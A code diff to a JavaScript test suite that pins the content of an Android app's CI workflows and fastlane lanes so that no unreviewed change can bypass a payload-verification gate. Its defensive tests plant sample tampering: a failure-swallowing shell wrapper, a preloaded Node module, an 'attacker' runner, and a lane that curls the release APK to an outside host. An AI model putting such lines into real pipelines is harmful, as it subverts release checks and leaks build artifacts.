@@ -24,6 +24,13 @@ const WORKFLOW_DIR = path.join(ROOT, '.github', 'workflows');
 // Named explicitly rather than globbed: a fourth Fastfile ships inside
 // vendor/bundle wherever `bundle install` has run, so a glob count would be
 // environment-dependent and unfit for a vacuity guard.
+/** Pinned by content, like the composites: free-form Ruby behind one `run:`. */
+const ACCOUNTED_FASTFILES = {
+  root: 'c50e1384844af4d5c37cd9d5',
+  android: '3173e30e8166a178fafe40a0',
+  ios: '9d6c9e883a56dfe47abc0462',
+};
+
 const FASTFILES = [
   ['root', path.join(ROOT, 'fastlane', 'Fastfile')],
   ['android', path.join(ROOT, 'android', 'fastlane', 'Fastfile')],
@@ -92,34 +99,50 @@ function codeOf(text) {
  * A step's whole content, canonically. Every key is included — `env`,
  * `working-directory`, `if`, `with`, `uses`, and any key GitHub adds later —
  * because naming the ones that matter is the judgement this file has learned
- * not to make. The script is the parsed one, so a comment edit is not a change
- * and an edit to what runs always is.
+ * not to make. The script is the comment-stripped one, so rewording a comment
+ * is not a change — adding or removing a comment *line* is, because stripping
+ * leaves the blank line behind.
  */
-function digestOf(step) {
-  const canonical = value => {
-    if (Array.isArray(value)) {
-      return value.map(canonical);
-    }
-    if (value && typeof value === 'object') {
-      return Object.keys(value)
-        .sort()
-        .reduce((out, key) => {
-          out[key] = key === 'run' ? codeOf(value[key]) : canonical(value[key]);
-          return out;
-        }, {});
-    }
-    return value;
-  };
-  const {run: _raw, ...rest} = step.raw ?? {};
-  return createHash('sha256')
-    .update(
-      JSON.stringify(
-        canonical({...rest, run: step.run, uses: step.uses, with: step.with}),
-      ),
-    )
+const canonical = value => {
+  if (Array.isArray(value)) {
+    return value.map(canonical);
+  }
+  if (value && typeof value === 'object') {
+    return Object.keys(value)
+      .sort()
+      .reduce((out, key) => {
+        out[key] = key === 'run' ? codeOf(value[key]) : canonical(value[key]);
+        return out;
+      }, {});
+  }
+  return value;
+};
+
+const digestOfValue = value =>
+  createHash('sha256')
+    .update(JSON.stringify(canonical(value)))
     .digest('hex')
-    .slice(0, 12);
+    .slice(0, 24);
+
+function digestOf(step) {
+  const {run: _raw, ...rest} = step.raw;
+  return digestOfValue({
+    ...rest,
+    run: step.run,
+    uses: step.uses,
+    with: step.with,
+  });
 }
+
+/**
+ * The container a step runs in. `defaults.run.shell` can replace the shell for
+ * every step in the job — `bash -c "bash {0}; true"` makes each one exit 0 —
+ * `env` can preload a module into every `node`, `working-directory` moves the
+ * paths a script's flags name, and `container`/`runs-on` decide the machine.
+ * None of that is visible in any step, and all of it decides what a step does.
+ */
+const jobDigestOf = job =>
+  digestOfValue({job: job.jobKeys, workflow: job.workflowKeys});
 
 function parseLanes() {
   const lanes = [];
@@ -147,23 +170,37 @@ function parseWorkflows() {
       const doc = yaml.load(
         fs.readFileSync(path.join(WORKFLOW_DIR, file), 'utf-8'),
       );
-      const jobs = Object.entries(doc.jobs || {}).map(([id, job]) => ({
-        workflow: file,
-        id,
-        steps: (job.steps || []).map((step, index) => ({
+      const {jobs: _jobs, ...workflowKeys} = doc;
+      const jobs = Object.entries(doc.jobs || {}).map(([id, job]) => {
+        const {steps: _steps, ...jobKeys} = job;
+        return {
           workflow: file,
-          job: id,
-          index,
-          name: step.name || `(step ${index})`,
-          run: codeOf(step.run || ''),
-          uses: step.uses || '',
-          with: step.with || {},
-          raw: step,
-        })),
-      }));
+          id,
+          jobKeys,
+          workflowKeys,
+          steps: (job.steps || []).map((step, index) => ({
+            workflow: file,
+            job: id,
+            index,
+            name: step.name || `(step ${index})`,
+            run: codeOf(step.run || ''),
+            uses: step.uses || '',
+            with: step.with || {},
+            raw: step,
+          })),
+        };
+      });
       return {file, jobs};
     });
 }
+
+const fastfileDigest = () =>
+  Object.fromEntries(
+    FASTFILES.map(([origin, file]) => [
+      origin,
+      digestOfValue(codeOf(fs.readFileSync(file, 'utf-8'))),
+    ]),
+  );
 
 const model = () => ({workflows: parseWorkflows(), lanes: parseLanes()});
 const allJobs = m => m.workflows.flatMap(workflow => workflow.jobs);
@@ -183,12 +220,29 @@ const where = step => `${step.workflow} ${step.job} → ${step.name}`;
  * building-ness rests on this resolution.
  */
 function lanesInvokedBy(step, lanes) {
-  const named = new Set(
-    [...step.run.matchAll(/fastlane\s+([\w\s]+)/g)].flatMap(match =>
-      match[1].split(/\s+/),
-    ),
-  );
-  return lanes.filter(lane => named.has(lane.name));
+  const named = body =>
+    new Set(
+      [...body.matchAll(/fastlane\s+([\w\s]+)/g)].flatMap(match =>
+        match[1].split(/\s+/),
+      ),
+    );
+  // Transitively: a lane may call another by bare name, so a body reached this
+  // way is as much part of what the step does as the one it named directly.
+  const reached = new Map();
+  const walk = names => {
+    for (const lane of lanes.filter(
+      candidate => names.has(candidate.name) && !reached.has(candidate.name),
+    )) {
+      reached.set(lane.name, lane);
+      const calls = new Set([
+        ...named(lane.body),
+        ...[...lane.body.matchAll(/^\s*(\w+)\s*$/gm)].map(match => match[1]),
+      ]);
+      walk(calls);
+    }
+  };
+  walk(named(step.run));
+  return [...reached.values()];
 }
 
 /**
@@ -214,10 +268,8 @@ function artifactsIn(text) {
 }
 
 /**
- * One entry per `git push`, its arguments trimmed — including the empty string
- * for a bare push. Dropping the empty entries loses the invocation itself, so a
- * bare `git push` classified as nothing and `every(…)` over the result was
- * vacuously true.
+ * One entry per `git push`, its arguments trimmed — the empty string included,
+ * because a bare push is an invocation and not an absence.
  */
 function gitPushArguments(run) {
   return [...run.matchAll(/git\s+push\b([^\n]*)/g)].map(match =>
@@ -238,8 +290,10 @@ function publishesAndroid(body) {
 function isBuildingJob(job, lanes) {
   return job.steps.some(step => {
     const script = step.run.replace(/\\\n\s*/g, ' ');
+    // Any gradle invocation at all. Naming the tasks that build meant missing
+    // `build`, and `:app:aPR` abbreviates `:app:assembleProdRelease`.
     return (
-      /\b(?:gradlew|gradle)\b[^\n]*\b(?:assemble|bundle)/i.test(script) ||
+      /\b(?:gradlew|gradle)\b/.test(script) ||
       lanesInvokedBy(step, lanes).some(lane => buildsAndroid(lane.body))
     );
   });
@@ -259,14 +313,6 @@ function gateExamines(step) {
 }
 
 /**
- * A publisher whose bytes this parse cannot name. It is refused rather than
- * skipped: the gate cannot be shown to have read bytes the parse cannot
- * identify, and a rule with nothing to compare reads exactly like a satisfied
- * one.
- */
-const UNRESOLVED_PATH = '(a path this parse cannot resolve)';
-
-/**
  * A `with:` path field, split into what it actually names. The whole value is
  * a path here — one per line, or one per list entry — so anything that is not
  * a concrete filename hides one, whatever directory it lives in. Keying on
@@ -275,11 +321,14 @@ const UNRESOLVED_PATH = '(a path this parse cannot resolve)';
  */
 /**
  * The uploads whose paths are known not to be build output. Small, pinned, and
- * asserted disjoint from `build/outputs`: a concrete filename that is not an
- * `.apk`/`.aab` is not thereby harmless — `tar czf out/x.tgz …/apk` produces
- * one — so the parse vouches only for names written down here.
+ * asserted to reach no build-output directory: a concrete filename that is not
+ * an `.apk`/`.aab` is not thereby harmless — `tar czf out/x.tgz …/apk` produces
+ * one — so the parse vouches only for the paths written down here.
  */
-const NON_ARTIFACT_UPLOADS = ['payload-report.txt', 'PocketPal.app.dSYM.zip'];
+const NON_ARTIFACT_UPLOADS = [
+  'payload-report.txt',
+  'ios/build/PocketPal.app.dSYM.zip',
+];
 
 /**
  * A `with:` path field, split into what it names. The whole value is a path
@@ -307,9 +356,11 @@ function pathFieldNames(value) {
     if (/\.(?:apk|aab)$/.test(base)) {
       return {kind: 'artifact', token: base};
     }
-    return NON_ARTIFACT_UPLOADS.includes(base)
-      ? {kind: 'declared', token: base}
-      : {kind: 'undeclared', token: base};
+    // Matched on the whole path, not the basename: `…/build/outputs/payload-report.txt`
+    // is a different file from the one declared here.
+    return NON_ARTIFACT_UPLOADS.includes(token)
+      ? {kind: 'declared', token}
+      : {kind: 'undeclared', token};
   });
 }
 
@@ -499,12 +550,23 @@ const STEP_ASSERTIONS = {
   },
 };
 
+/**
+ * The container digest of each building job: its own keys and its workflow's.
+ * Pinned exactly as the steps are, and for the same reason — the step pin says
+ * what runs, and this says what it runs inside.
+ */
+const ACCOUNTED_JOBS = {
+  'ci.yml/build-android': '5fd36b4c2d4f458ecea15067',
+  'e2e-tests.yml/build-android': '64c3e66ce532792211e56a71',
+  'release.yml/build_android': '245f22e44c67837147d62cf4',
+};
+
 const ACCOUNTED_STEPS = [
   [
     'ci.yml',
     'build-android',
     'Check out code',
-    'ddb2f046a7c1',
+    'ddb2f046a7c14c47cb2aca25',
     'checks out the repository',
     'action',
   ],
@@ -512,7 +574,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Maximize build space',
-    '4d41c4a237cd',
+    '4d41c4a237cdd832e94ca58d',
     'frees disk before the toolchains install',
     'handlesNoArtifact',
   ],
@@ -520,7 +582,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Set up Node.js',
-    '8f92aaf91be0',
+    '8f92aaf91be034f522d95925',
     'installs Node',
     'action',
   ],
@@ -528,7 +590,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Cache node_modules',
-    'f4ef7d943135',
+    'f4ef7d94313503bc5e42fbea',
     'restores the dependency cache',
     'action',
   ],
@@ -536,7 +598,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Install Yarn',
-    '74f8204ffaff',
+    '74f8204ffaff7cc6680b3f4f',
     'installs the package manager',
     'handlesNoArtifact',
   ],
@@ -544,7 +606,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Install dependencies',
-    'df124beeabda',
+    'df124beeabda40ea24cff7e5',
     'installs the JS dependency tree',
     'handlesNoArtifact',
   ],
@@ -552,7 +614,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Derive the rnllama variant allowlist from the payload manifest',
-    '27fd84e82e81',
+    '27fd84e82e8128653d865ec8',
     'reads the manifest and exports a gradle property',
     'handlesNoArtifact',
   ],
@@ -560,7 +622,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Cache llama.rn native build tree',
-    'a7690de26de0',
+    'a7690de26de00d99595df1d1',
     'restores the native build tree',
     'action',
   ],
@@ -568,7 +630,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Set up JDK 17',
-    'bcb91f2c754f',
+    'bcb91f2c754f7c81fdfa1899',
     'installs the JDK',
     'action',
   ],
@@ -576,7 +638,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Set up the Hexagon SDK',
-    'fb3527993437',
+    'fb3527993437be992b2b10a0',
     'fetches and verifies the Hexagon SDK',
     'action',
   ],
@@ -584,7 +646,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Set up ccache',
-    '71c9892ff908',
+    '71c9892ff90802db41d716d7',
     'restores the compiler cache',
     'action',
   ],
@@ -592,7 +654,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Create dummy google-services.json for CI',
-    'e15bdfd6f028',
+    'e15bdfd6f028509f2867d597',
     'writes a placeholder config',
     'handlesNoArtifact',
   ],
@@ -600,7 +662,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Create dummy .env file for CI',
-    '0752168128c6',
+    '0752168128c67ff7b87d9bea',
     'writes placeholder build configuration',
     'handlesNoArtifact',
   ],
@@ -608,7 +670,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Create dummy release keystore for CI',
-    'e2776b4eece8',
+    'e2776b4eece8c6640def243c',
     'writes a throwaway signing key',
     'handlesNoArtifact',
   ],
@@ -616,7 +678,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Build Android Release',
-    '8edc74417d96',
+    '8edc74417d96cb7debd71aa5',
     'builds the artifact the gate then examines in the same job',
     'buildsThenIsGated',
   ],
@@ -624,7 +686,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'ccache statistics',
-    '79d772e38080',
+    '79d772e38080380d4f45facf',
     'prints compiler cache counters',
     'handlesNoArtifact',
   ],
@@ -632,7 +694,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Verify the variant allowlist reached the llama.rn build',
-    '698e98dba6cc',
+    '698e98dba6cc9c1f508193a3',
     'greps the build log for the declared variant list',
     'handlesNoArtifact',
   ],
@@ -640,7 +702,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Verify prod APK has no automation-bridge code (DCE sanity check)',
-    '507d08fb6e5b',
+    '507d08fb6e5b78d1044cd9ce',
     'reads the built APK to assert what it does not contain',
     'carriesNoTransport',
   ],
@@ -648,7 +710,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Verify the Android payload',
-    'ea93b4c01dbd',
+    'ea93b4c01dbd7de15eaa17f8',
     'is the payload gate itself',
     'isGateStep',
   ],
@@ -656,7 +718,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Upload payload report',
-    'c9025c2bef53',
+    'c9025c2bef53b6cb994fda70',
     "uploads the gate's report, which is evidence about the artifact rather than the artifact",
     'reportUpload',
   ],
@@ -664,7 +726,7 @@ const ACCOUNTED_STEPS = [
     'ci.yml',
     'build-android',
     'Upload Android APK',
-    '74ec2ebad81a',
+    '74ec2ebad81aab6c9ac1d101',
     'publishes the checked APK as a workflow artifact',
     'publisher',
   ],
@@ -672,7 +734,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Checkout',
-    'cf37721dff3e',
+    'cf37721dff3e3d1d92137794',
     'checks out the repository',
     'action',
   ],
@@ -680,7 +742,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Setup Java',
-    '3a5994f8db80',
+    '3a5994f8db80c1d68c8d7766',
     'installs the JDK',
     'action',
   ],
@@ -688,7 +750,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Setup Node.js',
-    '72f06927c12c',
+    '72f06927c12cb51147347849',
     'installs Node',
     'action',
   ],
@@ -696,7 +758,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Install dependencies',
-    '1781a40fca38',
+    '1781a40fca382b9ee3009490',
     'installs the JS dependency tree',
     'handlesNoArtifact',
   ],
@@ -704,7 +766,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Derive the rnllama variant allowlist from the payload manifest',
-    '27fd84e82e81',
+    '27fd84e82e8128653d865ec8',
     'reads the manifest and exports a gradle property',
     'handlesNoArtifact',
   ],
@@ -712,7 +774,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Set up the Hexagon SDK',
-    'fb3527993437',
+    'fb3527993437be992b2b10a0',
     'fetches and verifies the Hexagon SDK',
     'action',
   ],
@@ -720,7 +782,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Create dummy google-services.json for CI',
-    '5b3655f75fe0',
+    '5b3655f75fe0cd8f0da5a43c',
     'writes a placeholder config',
     'handlesNoArtifact',
   ],
@@ -728,7 +790,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Create dummy .env file for CI',
-    'b1cbd6733e44',
+    'b1cbd6733e44731e10eff450',
     'writes placeholder build configuration',
     'handlesNoArtifact',
   ],
@@ -736,7 +798,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Create dummy release keystore for CI',
-    '59912466755b',
+    '59912466755b57ee64d54974',
     'writes a throwaway signing key',
     'handlesNoArtifact',
   ],
@@ -744,7 +806,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Build Android E2E APK',
-    '404ac64be90c',
+    '404ac64be90c0065f456113d',
     'builds the artifact the gate then examines in the same job',
     'buildsThenIsGated',
   ],
@@ -752,7 +814,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Verify the variant allowlist reached the llama.rn build',
-    '698e98dba6cc',
+    '698e98dba6cc9c1f508193a3',
     'greps the build log for the declared variant list',
     'handlesNoArtifact',
   ],
@@ -760,7 +822,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Verify the Android payload',
-    '96059495fc7c',
+    '96059495fc7c0d510fd52aaa',
     'is the payload gate itself',
     'isGateStep',
   ],
@@ -768,7 +830,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Upload payload report',
-    'c9025c2bef53',
+    'c9025c2bef53b6cb994fda70',
     "uploads the gate's report, which is evidence about the artifact rather than the artifact",
     'reportUpload',
   ],
@@ -776,7 +838,7 @@ const ACCOUNTED_STEPS = [
     'e2e-tests.yml',
     'build-android',
     'Upload APK artifact',
-    'a268f3772d59',
+    'a268f3772d59a8970b71e979',
     'publishes the checked APK as a workflow artifact',
     'publisher',
   ],
@@ -784,7 +846,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Checkout code',
-    'ed632cdea590',
+    'ed632cdea5905cf8c8949d4e',
     'checks out the repository',
     'action',
   ],
@@ -792,7 +854,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Maximize build space',
-    '4d41c4a237cd',
+    '4d41c4a237cdd832e94ca58d',
     'frees disk before the toolchains install',
     'handlesNoArtifact',
   ],
@@ -800,7 +862,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Set up JDK 17',
-    '93c113a968c5',
+    '93c113a968c5acb9a42759bb',
     'installs the JDK',
     'action',
   ],
@@ -808,7 +870,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Set up Node.js',
-    '8f92aaf91be0',
+    '8f92aaf91be034f522d95925',
     'installs Node',
     'action',
   ],
@@ -816,7 +878,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Install dependencies',
-    'df124beeabda',
+    'df124beeabda40ea24cff7e5',
     'installs the JS dependency tree',
     'handlesNoArtifact',
   ],
@@ -824,7 +886,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Derive the rnllama variant allowlist from the payload manifest',
-    '27fd84e82e81',
+    '27fd84e82e8128653d865ec8',
     'reads the manifest and exports a gradle property',
     'handlesNoArtifact',
   ],
@@ -832,7 +894,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Set up the Hexagon SDK',
-    'fb3527993437',
+    'fb3527993437be992b2b10a0',
     'fetches and verifies the Hexagon SDK',
     'action',
   ],
@@ -840,7 +902,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Set up Ruby',
-    'c6bd8de9ca3a',
+    'c6bd8de9ca3a97dfa137eb1a',
     'installs Ruby and the bundle',
     'action',
   ],
@@ -848,7 +910,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Bump versions',
-    'edf1504a267b',
+    'edf1504a267b4f22dbcfbcbb',
     'rewrites the version in tracked files',
     'handlesNoArtifact',
   ],
@@ -856,7 +918,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Commit and push version changes',
-    '14002b2eb6a5',
+    '14002b2eb6a5a9041659e3a3',
     'pushes the version-bump commit; the tag is pushed after the gate',
     'pushesOnlyTheBumpCommit',
   ],
@@ -864,7 +926,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Set up Android Keystore',
-    'e8ae052abd03',
+    'e8ae052abd033b10f315b388',
     'writes the signing keystore',
     'handlesNoArtifact',
   ],
@@ -872,7 +934,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Authenticate to Google Cloud',
-    '6ab20557d737',
+    '6ab20557d737acb66b9c5019',
     'mints a Google Cloud credential',
     'action',
   ],
@@ -880,7 +942,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Create .env file',
-    '932c23c2e022',
+    '932c23c2e0226c77099b814d',
     'writes build configuration',
     'handlesNoArtifact',
   ],
@@ -888,7 +950,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Build Android app',
-    'efc23e757a4e',
+    'efc23e757a4ec3576d0ed3f8',
     'builds the artifacts the gate then examines in the same job',
     'buildsThenIsGated',
   ],
@@ -896,7 +958,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Verify the variant allowlist reached the llama.rn build',
-    '698e98dba6cc',
+    '698e98dba6cc9c1f508193a3',
     'greps the build log for the declared variant list',
     'handlesNoArtifact',
   ],
@@ -904,7 +966,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Verify the Android payload',
-    '3a5ceba12bf9',
+    '3a5ceba12bf9ca828dfb3373',
     'is the payload gate itself',
     'isGateStep',
   ],
@@ -912,7 +974,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Upload payload report',
-    'c9025c2bef53',
+    'c9025c2bef53b6cb994fda70',
     "uploads the gate's report, which is evidence about the artifact rather than the artifact",
     'reportUpload',
   ],
@@ -920,7 +982,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Upload Android app to Alpha track',
-    '3f3f10876f2c',
+    '3f3f10876f2cdb90f5d7e89b',
     'publishes the checked bundle to Play',
     'publisher',
   ],
@@ -928,7 +990,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Push the release tag',
-    'bba9bef8ba94',
+    'bba9bef8ba948fa546cc2ed2',
     'pushes the release tag after the gate',
     'publisher',
   ],
@@ -936,7 +998,7 @@ const ACCOUNTED_STEPS = [
     'release.yml',
     'build_android',
     'Create GitHub Release',
-    '62888b052a79',
+    '62888b052a7934ada019efc1',
     'publishes the checked APK to a GitHub Release',
     'publisher',
   ],
@@ -1275,12 +1337,6 @@ function violationsOfPathIdentity(m) {
         );
       }
       for (const artifact of publisher.paths) {
-        if (artifact === UNRESOLVED_PATH) {
-          problems.push(
-            `${where(step)} publishes a path this parse cannot resolve to a filename, so no gate step can be shown to have examined it`,
-          );
-          continue;
-        }
         const gate = gates
           .filter(
             candidate =>
@@ -1337,8 +1393,7 @@ function violationsOfGateCanFail(m) {
     for (const step of job.steps) {
       const publisher = publisherOf(step, m.lanes);
       // A report upload ships evidence about the artifact rather than the
-      // artifact, and runs whatever the gate decided. A tag push names no file
-      // and is still a publish.
+      // artifact. A tag push names no file and is still a publish.
       const shipsOnlyDeclaredFiles =
         publisher &&
         publisher.declared > 0 &&
@@ -1451,6 +1506,16 @@ function violationsOfUnaccountedSteps(m) {
   for (const job of allJobs(m)) {
     if (!isBuildingJob(job, m.lanes)) {
       continue;
+    }
+    const container = ACCOUNTED_JOBS[`${job.workflow}/${job.id}`];
+    if (!container) {
+      problems.push(
+        `${job.workflow} ${job.id} builds Android and its job and workflow keys are not accounted for`,
+      );
+    } else if (jobDigestOf(job) !== container) {
+      problems.push(
+        `${job.workflow} ${job.id} has changed around its steps since it was reviewed (container ${jobDigestOf(job)}, accounted as ${container})`,
+      );
     }
     for (const step of job.steps) {
       const entries = accountedEntriesFor(step);
@@ -1738,6 +1803,24 @@ describe('the parse itself', () => {
       3,
     );
     expect(Object.keys(ALLOWED_ACTIONS)).toHaveLength(14);
+  });
+
+  it('pins every Fastfile by content, and the declared uploads reach no build output', () => {
+    expect(fastfileDigest()).toEqual(ACCOUNTED_FASTFILES);
+    for (const declared of NON_ARTIFACT_UPLOADS) {
+      expect(declared).not.toContain('build/outputs');
+    }
+  });
+
+  it('resolves every accounted row to an assertion that exists', () => {
+    // A mistyped key yields `undefined`, and an entry with no assertion is a
+    // row that floors nothing.
+    for (const entry of ACCOUNTED_STEPS) {
+      expect({
+        entry: `${entry.workflow} ${entry.step}`,
+        resolved: entry.assert !== undefined || entry.digest !== null,
+      }).toEqual({entry: `${entry.workflow} ${entry.step}`, resolved: true});
+    }
   });
 
   it('reads the two Android fastlane lanes and what each one does', () => {
@@ -2482,9 +2565,8 @@ describe('each rule is capable of failing', () => {
   });
 
   /**
-   * The content pin. Being recognised — as a publisher, as the gate, as an
-   * allowlisted action — does not end the enquiry: a line appended inside an
-   * already-accounted step costs the same reviewed line as a new step.
+   * A line appended inside an already-accounted step costs the same reviewed
+   * line as a new step.
    */
   it.each([
     [
@@ -2582,6 +2664,132 @@ describe('each rule is capable of failing', () => {
     expect(isBuildingJob(jobIn(m, 'ci.yml', 'build-android'), m.lanes)).toBe(
       true,
     );
+  });
+
+  /**
+   * The container a step runs in decides what the step does. None of these
+   * touches a step, and every one of them changes what every step executes.
+   */
+  it.each([
+    [
+      'a shell that swallows every failure',
+      {defaults: {run: {shell: 'bash -c "bash {0}; true"'}}},
+    ],
+    [
+      'a module preloaded into every node',
+      {env: {NODE_OPTIONS: '--require ./neutralise.js'}},
+    ],
+    [
+      'a working directory the paths no longer reach',
+      {defaults: {run: {'working-directory': '/tmp/decoy'}}},
+    ],
+    ['a different machine', {'runs-on': ['self-hosted', 'attacker']}],
+    ['a container', {container: 'ghcr.io/example/img'}],
+  ])('refuses a building job carrying %s', (_label, patch) => {
+    const m = broken();
+    Object.assign(jobIn(m, 'ci.yml', 'build-android').jobKeys, patch);
+
+    expect(violationsOfUnaccountedSteps(m)).toEqual([
+      expect.stringContaining('has changed around its steps'),
+    ]);
+  });
+
+  it('refuses a workflow-level env block added around a building job', () => {
+    const m = broken();
+    jobIn(m, 'ci.yml', 'build-android').workflowKeys.env = {
+      NODE_OPTIONS: '--require ./neutralise.js',
+    };
+
+    expect(violationsOfUnaccountedSteps(m)).toEqual([
+      expect.stringContaining('has changed around its steps'),
+    ]);
+  });
+
+  /**
+   * A lane may call another by bare name. The build lane is 1300 bytes of Ruby
+   * behind one `run:`, and what it delegates to is as much part of the step as
+   * what it says.
+   */
+  it('reads a lane reached only through another lane', () => {
+    const m = broken();
+    const build = m.lanes.find(lane => lane.name === 'build_android_release');
+    build.body += '\n    ship_it\n';
+    m.lanes.push({
+      origin: 'android',
+      name: 'ship_it',
+      body: 'lane :ship_it do\n  sh("curl -T app-prod-release.apk https://example.com/")\nend',
+    });
+    const step = stepIn(m, 'release.yml', 'build_android', 'Build Android app');
+
+    expect(lanesInvokedBy(step, m.lanes).map(lane => lane.name)).toContain(
+      'ship_it',
+    );
+    expect(
+      carriesNoTransport(step, jobIn(m, 'release.yml', 'build_android'), m),
+    ).toBe(false);
+  });
+
+  it('refuses a Fastfile edited since it was reviewed', () => {
+    const edited = {...ACCOUNTED_FASTFILES, android: 'not-the-pinned-digest'};
+    expect(fastfileDigest()).not.toEqual(edited);
+  });
+
+  it('refuses a gate step that gains a key beyond its script', () => {
+    const m = broken();
+    Object.assign(
+      stepIn(m, 'ci.yml', 'build-android', 'Verify the Android payload').raw,
+      {env: {NODE_OPTIONS: '--require ./x.js'}},
+    );
+
+    expect(violationsOfGateCanFail(m)).toEqual([
+      expect.stringContaining('which the gate step may not set'),
+    ]);
+  });
+
+  it('refuses an upload of a declared name from a build-output directory', () => {
+    const m = broken();
+    const job = jobIn(m, 'ci.yml', 'build-android');
+    job.steps.push(
+      asParsed({
+        workflow: 'ci.yml',
+        job: 'build-android',
+        index: job.steps.length,
+        name: 'Upload payload report',
+        run: '',
+        uses: 'actions/upload-artifact@v4',
+        with: {
+          name: 'payload-report',
+          path: 'android/app/build/outputs/payload-report.txt',
+        },
+        raw: {},
+      }),
+    );
+
+    expect(violationsOfPathIdentity(m)).toContainEqual(
+      expect.stringContaining('neither an Android artifact'),
+    );
+  });
+
+  it.each([
+    ['a plain build task', './gradlew build'],
+    ['an abbreviated task name', './gradlew :app:aPR'],
+  ])('sees %s as building Android', (_label, run) => {
+    const m = broken();
+    const job = jobIn(m, 'ci.yml', 'build-and-test');
+    job.steps.push(
+      asParsed({
+        workflow: 'ci.yml',
+        job: 'build-and-test',
+        index: job.steps.length,
+        name: 'Build it',
+        run,
+        uses: '',
+        with: {},
+        raw: {},
+      }),
+    );
+
+    expect(isBuildingJob(job, m.lanes)).toBe(true);
   });
 
   it('the lane-split rule fails when the fastlane lanes are re-merged', () => {
